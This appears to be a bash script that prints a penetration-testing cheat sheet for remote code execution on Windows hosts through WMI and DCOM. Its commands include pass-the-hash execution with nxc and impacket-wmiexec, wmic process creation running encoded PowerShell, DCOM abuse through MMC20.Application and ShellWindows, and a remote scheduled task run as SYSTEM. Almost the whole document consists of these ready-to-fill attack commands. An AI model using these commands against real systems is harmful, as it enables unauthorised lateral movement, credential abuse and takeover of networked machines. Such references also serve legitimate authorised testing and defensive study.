#!/bin/bash
BOLD='\033[1m'
CYAN='\033[36m'
GREEN='\033[32m'
YELLOW='\033[33m'
BLUE='\033[34m'
NC='\033[0m'

printf "\n"
echo -e "${BOLD}${YELLOW}── WMI / DCOM — REMOTE EXEC ─────────────────────────${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── WMI via nxc (preferred) ──────────────────────────${NC}"
echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -p <PASS> -x 'whoami' --exec-method wmiexec${NC}"
echo -e "  ${GREEN}nxc smb <TARGET> -u <USER> -H <NTLM> -x 'whoami' --exec-method wmiexec${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── impacket-wmiexec ─────────────────────────────────${NC}"
echo -e "  ${GREEN}impacket-wmiexec DOMAIN/user:pass@<TARGET>${NC}"
echo -e "  ${GREEN}impacket-wmiexec -hashes :<NTLM> Administrator@<TARGET>${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── wmic — Native Windows ────────────────────────────${NC}"
echo -e "  ${GREEN}wmic /node:<TARGET> process call create \"cmd.exe /c powershell -enc <BASE64>\"${NC}"
echo -e "  ${GREEN}wmic /node:<TARGET> /user:<USER> /password:<PASS> process call create \"calc.exe\"${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── PowerShell DCOM — MMC20.Application ──────────────${NC}"
echo -e "  ${GREEN}\$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\", \"<TARGET>\"))${NC}"
echo -e "  ${GREEN}\$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\", \$null, \"/c powershell -enc <BASE64>\", \"7\")${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── PowerShell DCOM — ShellWindows ───────────────────${NC}"
echo -e "  ${GREEN}\$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\", \"<TARGET>\"))${NC}"
echo -e "  ${GREEN}\$item = \$com.Item()${NC}"
echo -e "  ${GREEN}\$item.Document.Application.ShellExecute(\"cmd.exe\", \"/c powershell -enc <BASE64>\", 'C:\Windows\System32', \$null, 0)${NC}"
printf "\n"

echo -e "${BOLD}${CYAN}── Scheduled Task (Remote) ──────────────────────────${NC}"
echo -e "  ${GREEN}schtasks /create /tn \"shell\" /ru \"NT Authority\\SYSTEM\" /s <TARGET> /sc once /st 00:00 /tr \"powershell -enc <BASE64>\"${NC}"
echo -e "  ${GREEN}schtasks /RUN /TN \"shell\" /s <TARGET>${NC}"
printf "\n"

printf "\n"
echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
